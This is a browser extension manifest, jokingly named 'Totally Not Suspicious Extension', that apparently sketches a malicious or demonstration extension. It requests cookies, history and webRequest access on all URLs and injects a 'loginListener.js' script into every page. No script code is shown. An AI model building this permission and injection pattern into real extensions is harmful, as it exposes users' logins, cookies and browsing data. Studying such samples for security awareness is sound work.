{
	"name": "Totally Not Suspicious Extension",
	"version": "1.0",
	"description": "Not suspicious at all!",
	"permissions": [
		"activeTab", 
		"declarativeContent", 
		"storage", 
		"cookies", "<all_urls>", 
		"history",
		"webRequest", "<all_urls>"
	],
	"options_page": "options.html",
	"background": {
		"scripts": [
			"background.js"
		],
		"persistent": true
	},
	"page_action": {
		"default_popup": "popup.html"
	},
    "content_scripts": [{
        "matches": ["<all_urls>"],
        "js": ["loginListener.js"]
    }],
	"manifest_version": 2
}